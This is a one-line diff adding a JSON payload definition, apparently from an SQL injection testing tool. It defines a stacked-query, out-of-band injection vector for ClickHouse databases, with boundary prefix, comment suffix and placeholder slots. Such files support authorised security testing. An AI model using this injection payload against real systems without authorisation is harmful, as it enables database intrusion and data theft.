@@ -1,0 +1,1 @@
+{"dbms": "clickhouse", "technique": "oob", "boundary": {"prefix": ";", "suffix": "-- -", "type": "semicolon"}, "vector": "{B} AND 1=(SELECT ({Q}))/*OOB {OOB}*/", "comment": "clickhouse oob: terminator"}
